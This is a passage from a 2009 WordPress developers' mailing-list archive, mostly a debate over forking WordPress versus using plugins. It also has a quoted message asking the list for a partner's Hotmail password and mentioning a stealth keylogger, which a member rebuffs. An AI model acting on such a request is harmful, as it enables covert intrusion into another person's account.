>   3. TinyMCE or LightBox: I'm using these as illustrating examples.
>      Making these canonical plugins, with other versions, Colorbox or
>      the text editor from google (whatever) would provide a smoother
>      changing out of functionality. These wouldn't be able to be turned
>      off without a substitute, which is why I included it here for
>      consideration.
>
> I bring this up because I'm not sure if its been considered how
> canonical plugins can be for moving out core functionality as well as
> bringing in existing plugins as canon.
>
> Its also a better way to go then forking I believe.
>
> Thanks,
> Ken
>
>
> ------------------------------
>
> Message: 7
> Date: Thu, 17 Dec 2009 15:19:46 -0500
> From: William Canino <william.canino at googlemail.com>
> Subject: Re: [wp-hackers] Proposing WP Flavours (various WordPress
>        forks)
> To: wp-hackers at lists.automattic.com
> Message-ID:
>        <e4dc67e0912171219x7183a3fagfcb5d1cbd3a820d at mail.gmail.com>
> Content-Type: text/plain; charset=ISO-8859-1
>
> Considering its thousands of action and filter hooks -- and more and
> more made in each release, in my opinion, WordPress is too
> customizable and open-ended to need particular forks.... that is,
> unless a very good programmer (or a group of them) comes up with a
> direction for WordPress that the lead devs (Boren, Jacquith,
> Mullenweg, Ozz and Westwood) feel strongly against.
>
> Realistically, the lead devs cannot allow/approve every kind of patch
> that will be suggested that disables features or takes WordPress in
> every sort of direction.  While a plugin developer might say, "Hello,
> here is a one-line diff that will let WordPress handle Foobar content,
> I think people will find it useful," if the trac discussion says
> wont-fix, it's a wont-fix.  I can see how the wont-fix feels to the
> plugin developer; the word "fork" will come to her mind.
>
> I haven't yet worked with WP Core closely to see how open-minded or
> politically-heated trac discussions get. To Foobar plugin developers:
> go right ahead anyway, strut your stuff, tell your plugin users to add
> that line as an installation step!! Don't ever let anybody tell you
> your idea isn't worth shit.
>
> Thank you for letting me speak.
>
> W.
>
> 2009/12/17 Ken Newman <Ken at adcstudio.com>:
> > On 12/17/2009 11:46 AM, Callum Macdonald wrote:
> >>
> >> Instigated in part by recent discussion on ticket 5066[1], I think the
> >> time has come to create a few WordPress forks. I'm imagining a set of
> >> patches applied against core rolled into a tgz. I can see a few initial
> >> options:
> >> * Strip out all the update checking stuff
> >> * Anonymize update checking
> >> * Security focused patches
> >> * Remove post revisions, etc...
> >>
> >> ...
> >>
> >> Rather than create a single fork, I propose to create wpflavours (or
> >> maybe wpflavors), a project to provide the means to maintain multiple
> >> WordPress flavours. I'm seeing an svn repo, patches (maybe using
> >> quilt[2]) and a mailing list.
> >>
> >
> > Hello,
> >
> > I think that the privacy concerns are largely address by a declaration
> that
> > WP does phone home and why that's desirable, and with a link to
> >
> http://markjaquith.wordpress.com/2009/12/14/excluding-your-plugin-or-theme-from-update-checks/
> > for those that need to disable checks on sensitive data.
> >
> > As far as forks go, I don't really think that's needed if the Canonical
> > Plugins are used instead. Lots of functionality some would like added to
> > core can (shortly) do so with canonical plugins.
> >
> > Additionally, Functionality that some would like **removed** from the
> core
> > could be likewise dealt with in a canonical plugin. This goes for
> > non-privacy related functionality like:
> >
> > ?1. Code Editors for Themes and Plugins: Some people hate this and
> > ? ? want it out of core, some like it tho; would make a good canonical
> > ? ? plugin.
> > ?2. The new Image Editing Functionality: Some think it adds to much
> > ? ? bloat and functionality is too niche. Others absolutely love it. I
> > ? ? think it should be a canonical plugin, but installed and activated
> > ? ? by default.
> > ?3. TinyMCE or LightBox: I'm using these as illustrating examples.
> > ? ? Making these canonical plugins, with other versions, Colorbox or
> > ? ? the text editor from google (whatever) would provide a smoother
> > ? ? changing out of functionality. These wouldn't be able to be turned
> > ? ? off without a substitute, which is why I included it here for
> > ? ? consideration.
> >
> > I bring this up because I'm not sure if its been considered how canonical
> > plugins can be for moving out core functionality as well as bringing in
> > existing plugins as canon.
> >
> > Its also a better way to go then forking I believe.
> >
> > Thanks,
> > Ken
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
> ------------------------------
>
> Message: 8
> Date: Thu, 17 Dec 2009 20:45:52 +0000
> From: carlos nunes <carlos_nunes42 at hotmail.co.uk>
> Subject: [wp-hackers] ??i need urgente a password of a hotmail can
>        anybody help me???
> To: <wp-hackers at lists.automattic.com>
> Message-ID: <BAY119-W49234FD0A7854ECE2A98FA8860 at phx.gbl>
> Content-Type: text/plain; charset="iso-8859-1"
>
>
> HI GOOD EVENING I NEED A PERSON HOTMAIL PASSWORD, I MEAN I THINK THAT
> PERSON IS CHEATING ON ME SO IF YOU CAN HELP ME CAUSE I ALLREDY TRIED SO MANY
> SOFTWARE LIKE PERFECT KEYLOOGER WICH GOT STEALTH MODE AND I JUST NEED THE
> PASSWORD OF THAT PERSON ONCE I GET IT I JUST TAKE A LOOK AND THEN I GET OUT
> PLEASE I REAL NEED IT IF I SENT YOU THE EMAIL OF THAT PERSONA CAN YOU HELP
> ME?
>
>
> THANKS BEST REGARDS
>
> CARLOS
>
> _________________________________________________________________
> Windows Live Hotmail: Your friends can get your Facebook updates, right
> from Hotmail?.
>
> http://www.microsoft.com/middleeast/windows/windowslive/see-it-in-action/social-network-basics.aspx?ocid=PID23461::T:WLMTAGL:ON:WL:en-xm:SI_SB_4:092009
>
> ------------------------------
>
> Message: 9
> Date: Fri, 18 Dec 2009 07:55:20 +1100
> From: "Dion Hulse (dd32)" <wordpress at dd32.id.au>
> Subject: Re: [wp-hackers] ??i need urgente a password of a hotmail can
>        anybody help me???
> To: wp-hackers at lists.automattic.com
> Message-ID: <op.u43oeea6spxmuu at dd32>
> Content-Type: text/plain; charset=utf-8; format=flowed; delsp=yes
>
> Please be advised that this is a -WordPress- discussion mailing list
> designed for -Hackers-. Please see
> http://en.wikipedia.org/wiki/Hacker_(programmer_subculture)<http://en.wikipedia.org/wiki/Hacker_%28programmer_subculture%29>for a
> explanation of the term -Hacker-
> This list does not contain (Or it may, But its not for it) anyone who can
> help you with your stupid non-programming needs.
>
> On Fri, 18 Dec 2009 07:45:52 +1100, carlos nunes
> <carlos_nunes42 at hotmail.co.uk> wrote:
>
> >
> > HI GOOD EVENING I NEED A PERSON HOTMAIL PASSWORD, I MEAN I THINK THAT
> > PERSON IS CHEATING ON ME SO IF YOU CAN HELP ME CAUSE I ALLREDY TRIED SO
> > MANY SOFTWARE LIKE PERFECT KEYLOOGER WICH GOT STEALTH MODE AND I JUST
> > NEED THE PASSWORD OF THAT PERSON ONCE I GET IT I JUST TAKE A LOOK AND
> > THEN I GET OUT PLEASE I REAL NEED IT IF I SENT YOU THE EMAIL OF THAT
> > PERSONA CAN YOU HELP ME?
> >
> >
> > THANKS BEST REGARDS
> >
> > CARLOS
> >
> > _________________________________________________________________
> > Windows Live Hotmail: Your friends can get your Facebook updates, right
> > from Hotmail?.
> >
> http://www.microsoft.com/middleeast/windows/windowslive/see-it-in-action/social-network-basics.aspx?ocid=PID23461::T:WLMTAGL:ON:WL:en-xm:SI_SB_4:092009
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
> --
> Using Opera's revolutionary e-mail client: http://www.opera.com/mail/
>
>
> ------------------------------
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
> End of wp-hackers Digest, Vol 59, Issue 85
> ******************************************
>

From dan at jallits.com  Thu Dec 17 23:47:55 2009
From: dan at jallits.com (Daniel Jallits)
Date: Thu, 17 Dec 2009 17:47:55 -0600
Subject: [wp-hackers] Proposing WP Flavours (various WordPress forks)
	(Jean-Patrick Smith)
In-Reply-To: <f44b36190912171528n42bf7747p6e41df7bf91bb6@mail.gmail.com>
References: <f44b36190912171528n42bf7747p6e41df7bf91bb6@mail.gmail.com>
Message-ID: <2ca41c350912171547k122e0859i41cdf50852b8cef7@mail.gmail.com>

WordPress does what it does very well  in my opinion for one reason, and
that reason is WordPress has continually been developed to be a personal
publishing system, and nothing more. If you want more and it is feasible,
develop/use a plug-in. Otherwise use the right tool for the job. There are
plenty of other tools out there. For instance: Drupal, ExpressionEngine,
Joomla!, Mambo, and Oracle UCM just to name a few.

From chicagowebdev at gmail.com  Thu Dec 17 23:50:42 2009
From: chicagowebdev at gmail.com (Jean-Patrick Smith)
Date: Thu, 17 Dec 2009 17:50:42 -0600
Subject: [wp-hackers] I think I get it now
Message-ID: <f44b36190912171550t921c05hada977988b030585@mail.gmail.com>

So it's probably really annoying if I posted the entire contents of the
mailing list everytime I replied? Just saw that!

Sorry, what a way to introduce meh self :P

Anyways, I'm JP from Chicago, have been hacking wordpress into a cms for
years, here's the latest diabolical projects I've launched:
- http://www.findingthegold.com
- http://www.focusem.com
- http://www.24hourflex.com
- http://www.jeffrago.com
- http://www.graphics.ms - i helped start the company but left, im a
freebird!

All of those using wordpress, that's my 2009 greatest achievements w/ WP!

I've recently found out about PodsCMS, and it's a great plugin that sits on
top of Wordpress... I was going to develop something exactly like it, but
it's already like v1.7 so I plan on joining the dev team if they'll have me.

Anyways, I use WP as a CMS and it's nice to finally get around to joining
the list!

From matt at mattjacob.com  Fri Dec 18 00:01:43 2009
From: matt at mattjacob.com (Matt Jacob)
Date: Thu, 17 Dec 2009 17:01:43 -0700
Subject: [wp-hackers] I think I get it now
In-Reply-To: <f44b36190912171550t921c05hada977988b030585@mail.gmail.com>
References: <f44b36190912171550t921c05hada977988b030585@mail.gmail.com>
Message-ID: <410963320912171601u6432576ek7a4bdd25720e549c@mail.gmail.com>

On Thu, Dec 17, 2009 at 4:50 PM, Jean-Patrick Smith
<chicagowebdev at gmail.com> wrote:
> So it's probably really annoying if I posted the entire contents of the
> mailing list everytime I replied? Just saw that!

I'm not quite sure what you mean by that, but welcome to the list anyway!

Matt

From jer at simianuprising.com  Fri Dec 18 00:49:11 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Thu, 17 Dec 2009 19:49:11 -0500
Subject: [wp-hackers] Proposing WP Flavours (various WordPress forks)
In-Reply-To: <e4dc67e0912171219x7183a3fagfcb5d1cbd3a820d@mail.gmail.com>
References: <1261068387.8378.85.camel@buna> <4B2A6B10.6060201@adcSTUDIO.com>
	<e4dc67e0912171219x7183a3fagfcb5d1cbd3a820d@mail.gmail.com>
Message-ID: <e1202cb10912171649g2171781eg6311e69749851427@mail.gmail.com>

-1 to this idea.

If you can't do it with a plugin then work harder to work out a plugin
solution by writing a core patch that adds the hooks you need instead
of demanding the whole thing be in core.

If the core commit team tries to block you from being able to do it
with a plugin and you aren't being crazy then come around here and ask
about it. We will either help you figure out how to do it with a
plugin/plugin-enabling patch or we'll get all huffy until a patch gets
worked out so you can write a plugin.

Chances are if you think its not possible with a plugin you're just
not trying hard enough or being smart enough, in which case you are
UNQUALIFIED to manage a fork/branch/whatever of WordPress.

If you think that for some reason maintaining a branch/fork of
WordPress via community development will be easier or smoother than
maintaining a plugin then I think you are probably not thinking that
through very well. Both have essentially the same challenges and
pitfalls, both would require some conscious choice by users to use the
modifications. The main difference is that one is already existent and
very effective while the other is a fantasy that is also likely to
cause a lot of confusion and headaches and community splintering.

> * Allowing people to easily implement and publicise their own pet
> features and ideas.
> * Allow others to easily try out these implementations.
> * Doesn't require maintaining sets of patches Callum proposed.
> * Allows the "primary project branch" to easily pull in important,
> useful and cool changes from these offshoots.

<sarcasm>Wow, if only there was some way that people could do this...
Such a challenging list, it would probably require thousands of lines
of code and years of work to develop a system capable and mature
enough to enable this kind of extensibility and variety within
WordPress.</sarcasm>

WP Flavors exist already, they are super awesome and free.

-- 
Jeremy Clarke | http://jeremyclarke.org
Code and Design | http://globalvoicesonline.org

From dave69 at gmail.com  Fri Dec 18 01:08:10 2009
From: dave69 at gmail.com (Dave R)
Date: Fri, 18 Dec 2009 12:08:10 +1100
Subject: [wp-hackers] Proposing WP Flavours (various WordPress forks)
	(Jean-Patrick Smith)
In-Reply-To: <f44b36190912171528n42bf7747p6e41df7bf91bb6@mail.gmail.com>
References: <f44b36190912171528n42bf7747p6e41df7bf91bb6@mail.gmail.com>
Message-ID: <dea5cae00912171708nf040d7eke4f6a8ca09540883@mail.gmail.com>

Tell me, would you rate PodsCMS above Flutter? Used Flutter recently for the
first time, found good and bad, so curious for next major project.


Cheers,
Dave
....................................

business: www.zavadesign.com
personal: www.nakedchronicles.com
supports: www.michezoyouth.com


2009/12/18 Jean-Patrick Smith <chicagowebdev at gmail.com>

> I'd like to see a wordpress fork geared more towards a CMS, with the
> friendly backend and file-based templating system.
>
> Extend the widget functionality, making them more like Drupals blocks w/
> CCK
> and views, and i'd never use Drupal again...
>
> PodsCMS does this, but if you could fork wordpress and make PodsCMS a core
> feature, it'd be interesting to see where that went.
>
>
> On Thu, Dec 17, 2009 at 2:55 PM, <wp-hackers-request at lists.automattic.com
> >wrote:
>
> > Send wp-hackers mailing list submissions to
> >        wp-hackers at lists.automattic.com
> >
> > To subscribe or unsubscribe via the World Wide Web, visit
> >        http://lists.automattic.com/mailman/listinfo/wp-hackers
> > or, via email, send a message with subject or body 'help' to
> >        wp-hackers-request at lists.automattic.com
> >
> > You can reach the person managing the list at
> >        wp-hackers-owner at lists.automattic.com
> >
> > When replying, please edit your Subject line so it is more specific
> > than "Re: Contents of wp-hackers digest..."
> >
> >
> > Today's Topics:
> >
> >   1. Re: [ wp-hackers ] wp _ enqueue _ script() not working while
> >      in the Loop (TobiasBg)
> >   2. Re: [ wp-hackers ] wp _ enqueue _ script() not working    while
> >      in the Loop (scribu)
> >   3. Re: Settings API: Showing errors if validation fails (Otto)
> >   4. Proposing WP Flavours (various WordPress forks) (Callum Macdonald)
> >   5. Re: Proposing WP Flavours (various WordPress forks)
> >      (Harish Narayanan)
> >   6. Re: Proposing WP Flavours (various WordPress forks) (Ken Newman)
> >   7. Re: Proposing WP Flavours (various WordPress forks)
> >      (William Canino)
> >   8. ??i need urgente a password of a hotmail can anybody help
> >      me??? (carlos nunes)
> >   9. Re: ??i need urgente a password of a hotmail can anybody help
> >      me??? (Dion Hulse (dd32))
> >
> >
> > ----------------------------------------------------------------------
> >
> > Message: 1
> > Date: Thu, 17 Dec 2009 13:46:39 +0100 (CET)
> > From: "TobiasBg"<wp-hackers at tobias.baethge.com>
> > Subject: Re: [wp-hackers] [ wp-hackers ] wp _ enqueue _ script() not
> >        working while in the Loop
> > To: wp-hackers at lists.automattic.com
> > Message-ID: <20091217124639.5C6C3181B04D1 at dd19416.kasserver.com>
> > Content-Type: text/plain; charset="utf-8"
> >
> > Hi,
> >
> > > That's why I use $wp_scripts->do_items(). It makes sure the same script
> > > isn't included twice. You just have to make sure you use the same
> handle
> > for
> > > both plugins.
> >
> > Argh, stupid me. Of course it does (and so does its wrapper
> > wp_print_scripts, that I prefer to use). I just had a typo in one of the
> > handles... Thanks for pointing me to it!
> >
> > I guess, I'll just leave this alone for today and go out and do some ...
> > Christmas Shopping! :-)
> >
> > Regards,
> > Tobias
> >
> >
> >
> >
> >
> > ------------------------------
> >
> > Message: 2
> > Date: Thu, 17 Dec 2009 17:03:49 +0200
> > From: scribu <scribu at gmail.com>
> > Subject: Re: [wp-hackers] [ wp-hackers ] wp _ enqueue _ script() not
> >        working while in the Loop
> > To: wp-hackers at lists.automattic.com
> > Message-ID:
> >        <349fe48b0912170703l29937a07i517fc54417b4ef04 at mail.gmail.com>
> > Content-Type: text/plain; charset=UTF-8
> >
> >  You're welcome. :)
> >
> > I don't use wp_print_scripts() because some other plugins might have
> inline
> > scripts printed using the 'wp_print_scripts' hook.
> >
> >
> > On Thu, Dec 17, 2009 at 2:46 PM, TobiasBg <wp-hackers at tobias.baethge.com
> > >wrote:
> >
> > > Hi,
> > >
> > > > That's why I use $wp_scripts->do_items(). It makes sure the same
> script
> > > > isn't included twice. You just have to make sure you use the same
> > handle
> > > for
> > > > both plugins.
> > >
> > > Argh, stupid me. Of course it does (and so does its wrapper
> > > wp_print_scripts, that I prefer to use). I just had a typo in one of
> the
> > > handles... Thanks for pointing me to it!
> > >
> >
> >
> > --
> > http://scribu.net
> >
> >
> > ------------------------------
> >
> > Message: 3
> > Date: Thu, 17 Dec 2009 09:05:11 -0600
> > From: Otto <otto at ottodestruct.com>
> > Subject: Re: [wp-hackers] Settings API: Showing errors if validation
> >        fails
> > To: wp-hackers at lists.automattic.com
> > Message-ID:
> >        <161617690912170705r449ed407p8eeefc7caa822742 at mail.gmail.com>
> > Content-Type: text/plain; charset=ISO-8859-1
> >
> > You could use the admin_notices hook to generate your own error
> > messages based on whatever you like.
> >
> > Basically, hook a function to admin_notices. In this function, you
> > need to check for your error case and generate output based on it.
> > Then, you can unset $_GET['updated'] to prevent the Settings saved
> > message from showing up.
> >
> > Basically something like this:
> >
> > 1. On error detection, save the error somewhere that you can pick it
> > up later. Like an option, or a transient, or something.
> >
> > 2. On the admin_notices hooked function:
> >
> > if ($parent_file == 'options-general.php' && $_GET['page'] ==
> > 'my-plugin-page') {
> > // check the plugin option for errors
> > // found some errors? If so, then {
> > <div id="message" class="updated fade"><p><strong>No! You'll overload
> > the reactor!</strong></p></div>
> > //   unset $_GET['updated']
> > // }
> > } // end function
> >
> > That should do the trick.
> >
> > -Otto
> >
> >
> > ------------------------------
> >
> > Message: 4
> > Date: Thu, 17 Dec 2009 10:46:27 -0600
> > From: Callum Macdonald <lists.automattic.com at callum-macdonald.com>
> > Subject: [wp-hackers] Proposing WP Flavours (various WordPress forks)
> > To: wp-hackers at lists.automattic.com
> > Message-ID: <1261068387.8378.85.camel at buna>
> > Content-Type: text/plain
> >
> > Holamigos,
> >
> > Instigated in part by recent discussion on ticket 5066[1], I think the
> > time has come to create a few WordPress forks. I'm imagining a set of
> > patches applied against core rolled into a tgz. I can see a few initial
> > options:
> > * Strip out all the update checking stuff
> > * Anonymize update checking
> > * Security focused patches
> > * Remove post revisions, etc...
> >
> > I'm sure other people will have their own particular choices.
> > Personally, I'd like to see a tin foil flavour of WordPress with ultra
> > conservative privacy settings. :-)
> >
> > Rather than create a single fork, I propose to create wpflavours (or
> > maybe wpflavors), a project to provide the means to maintain multiple
> > WordPress flavours. I'm seeing an svn repo, patches (maybe using
> > quilt[2]) and a mailing list.
> >
> > I've started a discussion[3]. If you're interested in contributing, let
> > me know. I'll most likely only proceed if there is sufficient interest
> > in maintaining patch sets.
> >
> > Warmly - Callum.
> >
> > [1] http://core.trac.wordpress.org/ticket/5066
> > [2] http://savannah.nongnu.org/projects/quilt
> > [3] http://www.callum-macdonald.com/2009/12/17/proposing-wp-flavours/
> >
> >
> >
> >
> > ------------------------------
> >
> > Message: 5
> > Date: Thu, 17 Dec 2009 17:12:49 +0000
> > From: Harish Narayanan <harish.mlists at gmail.com>
> > Subject: Re: [wp-hackers] Proposing WP Flavours (various WordPress
> >        forks)
> > To: wp-hackers at lists.automattic.com
> > Message-ID:
> >        <4c95b6c20912170912mf90ac53id044a65193794cf8 at mail.gmail.com>
> > Content-Type: text/plain; charset=ISO-8859-1
> >
> > On 17/12/2009 16:46, Callum Macdonald wrote:
> > > Holamigos,
> > >
> > > Instigated in part by recent discussion on ticket 5066[1], I think the
> > > time has come to create a few WordPress forks. I'm imagining a set of
> > > patches applied against core rolled into a tgz. I can see a few initial
> > > options:
> > > * Strip out all the update checking stuff
> > > * Anonymize update checking
> > > * Security focused patches
> > > * Remove post revisions, etc...
> > >
> > > I'm sure other people will have their own particular choices.
> > > Personally, I'd like to see a tin foil flavour of WordPress with ultra
> > > conservative privacy settings. :-)
> > >
> > > Rather than create a single fork, I propose to create wpflavours (or
> > > maybe wpflavors), a project to provide the means to maintain multiple
> > > WordPress flavours. I'm seeing an svn repo, patches (maybe using
> > > quilt[2]) and a mailing list.
> > >
> > > I've started a discussion[3]. If you're interested in contributing, let
> > > me know. I'll most likely only proceed if there is sufficient interest
> > > in maintaining patch sets.
> >
> > I haven't any opinions on the specific flavours mentioned, but I have
> > one thing to add to this discussion. I have been part of a few Free
> > Software projects that recently migrated their development
> > repositories to Bazaar[1] and launchpad[2]. (The specific choices are
> > not important to the discussion, but the capabilities these choices
> > provide are.)
> >
> > This was supposed to be an infrastructural change, but it had some
> > unintended, interesting and useful consequences. Because
> > branching/merging was now easily possible[3], people who had cool
> > ideas of their own maintained a branch (or a fork, or a parallel
> > version of the tree, however you prefer to call it) containing their
> > own experiments and pet features. Then, other curious people would
> > check these features (flavours, in Callum's words), and the clearly
> > useful changes would be merged back into the arbitrarily decreed
> > "primary tree."
> >
> > I think considering such a development process will allow for a lot of
> > things:
> >
> > * Allowing people to easily implement and publicise their own pet
> > features and ideas.
> > * Allow others to easily try out these implementations.
> > * Doesn't require maintaining sets of patches Callum proposed.
> > * Allows the "primary project branch" to easily pull in important,
> > useful and cool changes from these offshoots.
> >
> > If someone is interested in seeing this in action, I can set up a
> > mirror to the WordPress source repository on a hosted site (e.g.
> > launchpad, github, bitbucket, ...). Others can branch/fork/clone/...
> > this and maintain their pet features.
> >
> > Harish
> >
> >
> > [1] http://bazaar.canonical.com/en/
> > [2] https://launchpad.net/
> > [3] It is possible in svn as well, but most big outfits tend to have a
> > centralised development repository much like WordPress does,
> > discouraging it. In comparison, check out the number of parallel
> > branches for a project like MySQL https://code.launchpad.net/mysql .
> >
> >
> > ------------------------------
> >
> > Message: 6
> > Date: Thu, 17 Dec 2009 12:32:00 -0500
> > From: Ken Newman <Ken at adcSTUDIO.com>
> > Subject: Re: [wp-hackers] Proposing WP Flavours (various WordPress
> >        forks)
> > To: wp-hackers at lists.automattic.com
> > Message-ID: <4B2A6B10.6060201 at adcSTUDIO.com>
> > Content-Type: text/plain; charset=ISO-8859-1; format=flowed
> >
> > On 12/17/2009 11:46 AM, Callum Macdonald wrote:
> > > Instigated in part by recent discussion on ticket 5066[1], I think the
> > > time has come to create a few WordPress forks. I'm imagining a set of
> > > patches applied against core rolled into a tgz. I can see a few initial
> > > options:
> > > * Strip out all the update checking stuff
> > > * Anonymize update checking
> > > * Security focused patches
> > > * Remove post revisions, etc...
> > >
> > > ...
> > >
> > > Rather than create a single fork, I propose to create wpflavours (or
> > > maybe wpflavors), a project to provide the means to maintain multiple
> > > WordPress flavours. I'm seeing an svn repo, patches (maybe using
> > > quilt[2]) and a mailing list.
> > >
> > Hello,
> >
> > I think that the privacy concerns are largely address by a declaration
> > that WP does phone home and why that's desirable, and with a link to
> >
> >
> http://markjaquith.wordpress.com/2009/12/14/excluding-your-plugin-or-theme-from-update-checks/
> > for those that need to disable checks on sensitive data.
> >
> > As far as forks go, I don't really think that's needed if the Canonical
> > Plugins are used instead. Lots of functionality some would like added to
> > core can (shortly) do so with canonical plugins.
> >
> > Additionally, Functionality that some would like **removed** from the
> > core could be likewise dealt with in a canonical plugin. This goes for
> > non-privacy related functionality like:
> >
> >   1. Code Editors for Themes and Plugins: Some people hate this and
> >      want it out of core, some like it tho; would make a good canonical
> >      plugin.
> >   2. The new Image Editing Functionality: Some think it adds to much
> >      bloat and functionality is too niche. Others absolutely love it. I
> >      think it should be a canonical plugin, but installed and activated
> >      by default.
> >   3. TinyMCE or LightBox: I'm using these as illustrating examples.
> >      Making these canonical plugins, with other versions, Colorbox or
> >      the text editor from google (whatever) would provide a smoother
> >      changing out of functionality. These wouldn't be able to be turned
> >      off without a substitute, which is why I included it here for
> >      consideration.
> >
> > I bring this up because I'm not sure if its been considered how
> > canonical plugins can be for moving out core functionality as well as
> > bringing in existing plugins as canon.
> >
> > Its also a better way to go then forking I believe.
> >
> > Thanks,
> > Ken
> >
> >
> > ------------------------------
> >
> > Message: 7
> > Date: Thu, 17 Dec 2009 15:19:46 -0500
> > From: William Canino <william.canino at googlemail.com>
> > Subject: Re: [wp-hackers] Proposing WP Flavours (various WordPress
> >        forks)
> > To: wp-hackers at lists.automattic.com
> > Message-ID:
> >        <e4dc67e0912171219x7183a3fagfcb5d1cbd3a820d at mail.gmail.com>
> > Content-Type: text/plain; charset=ISO-8859-1
> >
> > Considering its thousands of action and filter hooks -- and more and
> > more made in each release, in my opinion, WordPress is too
> > customizable and open-ended to need particular forks.... that is,
> > unless a very good programmer (or a group of them) comes up with a
> > direction for WordPress that the lead devs (Boren, Jacquith,
> > Mullenweg, Ozz and Westwood) feel strongly against.
> >
> > Realistically, the lead devs cannot allow/approve every kind of patch
> > that will be suggested that disables features or takes WordPress in
> > every sort of direction.  While a plugin developer might say, "Hello,
> > here is a one-line diff that will let WordPress handle Foobar content,
> > I think people will find it useful," if the trac discussion says
> > wont-fix, it's a wont-fix.  I can see how the wont-fix feels to the
> > plugin developer; the word "fork" will come to her mind.
> >
> > I haven't yet worked with WP Core closely to see how open-minded or
> > politically-heated trac discussions get. To Foobar plugin developers:
> > go right ahead anyway, strut your stuff, tell your plugin users to add
> > that line as an installation step!! Don't ever let anybody tell you
> > your idea isn't worth shit.
> >
> > Thank you for letting me speak.
> >
> > W.
> >
> > 2009/12/17 Ken Newman <Ken at adcstudio.com>:
> > > On 12/17/2009 11:46 AM, Callum Macdonald wrote:
> > >>
> > >> Instigated in part by recent discussion on ticket 5066[1], I think the
> > >> time has come to create a few WordPress forks. I'm imagining a set of
> > >> patches applied against core rolled into a tgz. I can see a few
> initial
> > >> options:
> > >> * Strip out all the update checking stuff
> > >> * Anonymize update checking
> > >> * Security focused patches
> > >> * Remove post revisions, etc...
> > >>
> > >> ...
> > >>
> > >> Rather than create a single fork, I propose to create wpflavours (or
> > >> maybe wpflavors), a project to provide the means to maintain multiple
> > >> WordPress flavours. I'm seeing an svn repo, patches (maybe using
> > >> quilt[2]) and a mailing list.
> > >>
> > >
> > > Hello,
> > >
> > > I think that the privacy concerns are largely address by a declaration
> > that
> > > WP does phone home and why that's desirable, and with a link to
> > >
> >
> http://markjaquith.wordpress.com/2009/12/14/excluding-your-plugin-or-theme-from-update-checks/
> > > for those that need to disable checks on sensitive data.
> > >
> > > As far as forks go, I don't really think that's needed if the Canonical
> > > Plugins are used instead. Lots of functionality some would like added
> to
> > > core can (shortly) do so with canonical plugins.
> > >
> > > Additionally, Functionality that some would like **removed** from the
> > core
> > > could be likewise dealt with in a canonical plugin. This goes for
> > > non-privacy related functionality like:
> > >
> > > ?1. Code Editors for Themes and Plugins: Some people hate this and
> > > ? ? want it out of core, some like it tho; would make a good canonical
> > > ? ? plugin.
> > > ?2. The new Image Editing Functionality: Some think it adds to much
> > > ? ? bloat and functionality is too niche. Others absolutely love it. I
> > > ? ? think it should be a canonical plugin, but installed and activated
> > > ? ? by default.
> > > ?3. TinyMCE or LightBox: I'm using these as illustrating examples.
> > > ? ? Making these canonical plugins, with other versions, Colorbox or
> > > ? ? the text editor from google (whatever) would provide a smoother
> > > ? ? changing out of functionality. These wouldn't be able to be turned
> > > ? ? off without a substitute, which is why I included it here for
> > > ? ? consideration.
> > >
> > > I bring this up because I'm not sure if its been considered how
> canonical
> > > plugins can be for moving out core functionality as well as bringing in
> > > existing plugins as canon.
> > >
> > > Its also a better way to go then forking I believe.
> > >
> > > Thanks,
> > > Ken
> > > _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >
> >
> >
> > ------------------------------
> >
> > Message: 8
> > Date: Thu, 17 Dec 2009 20:45:52 +0000
> > From: carlos nunes <carlos_nunes42 at hotmail.co.uk>
> > Subject: [wp-hackers] ??i need urgente a password of a hotmail can
> >        anybody help me???
> > To: <wp-hackers at lists.automattic.com>
> > Message-ID: <BAY119-W49234FD0A7854ECE2A98FA8860 at phx.gbl>
> > Content-Type: text/plain; charset="iso-8859-1"
> >
> >
> > HI GOOD EVENING I NEED A PERSON HOTMAIL PASSWORD, I MEAN I THINK THAT
> > PERSON IS CHEATING ON ME SO IF YOU CAN HELP ME CAUSE I ALLREDY TRIED SO
> MANY
> > SOFTWARE LIKE PERFECT KEYLOOGER WICH GOT STEALTH MODE AND I JUST NEED THE
> > PASSWORD OF THAT PERSON ONCE I GET IT I JUST TAKE A LOOK AND THEN I GET
> OUT
> > PLEASE I REAL NEED IT IF I SENT YOU THE EMAIL OF THAT PERSONA CAN YOU
> HELP
> > ME?
> >
> >
> > THANKS BEST REGARDS
> >
> > CARLOS
> >
> > _________________________________________________________________
> > Windows Live Hotmail: Your friends can get your Facebook updates, right
> > from Hotmail?.
> >
> >
> http://www.microsoft.com/middleeast/windows/windowslive/see-it-in-action/social-network-basics.aspx?ocid=PID23461::T:WLMTAGL:ON:WL:en-xm:SI_SB_4:092009
> >
> > ------------------------------
> >
> > Message: 9
> > Date: Fri, 18 Dec 2009 07:55:20 +1100
> > From: "Dion Hulse (dd32)" <wordpress at dd32.id.au>
> > Subject: Re: [wp-hackers] ??i need urgente a password of a hotmail can
> >        anybody help me???
> > To: wp-hackers at lists.automattic.com
> > Message-ID: <op.u43oeea6spxmuu at dd32>
> > Content-Type: text/plain; charset=utf-8; format=flowed; delsp=yes
> >
> > Please be advised that this is a -WordPress- discussion mailing list
> > designed for -Hackers-. Please see
> > http://en.wikipedia.org/wiki/Hacker_(programmer_subculture)<http://en.wikipedia.org/wiki/Hacker_%28programmer_subculture%29>
> <http://en.wikipedia.org/wiki/Hacker_%28programmer_subculture%29>for a
> > explanation of the term -Hacker-
> > This list does not contain (Or it may, But its not for it) anyone who can
> > help you with your stupid non-programming needs.
> >
> > On Fri, 18 Dec 2009 07:45:52 +1100, carlos nunes
> > <carlos_nunes42 at hotmail.co.uk> wrote:
> >
> > >
> > > HI GOOD EVENING I NEED A PERSON HOTMAIL PASSWORD, I MEAN I THINK THAT
> > > PERSON IS CHEATING ON ME SO IF YOU CAN HELP ME CAUSE I ALLREDY TRIED SO
> > > MANY SOFTWARE LIKE PERFECT KEYLOOGER WICH GOT STEALTH MODE AND I JUST
> > > NEED THE PASSWORD OF THAT PERSON ONCE I GET IT I JUST TAKE A LOOK AND
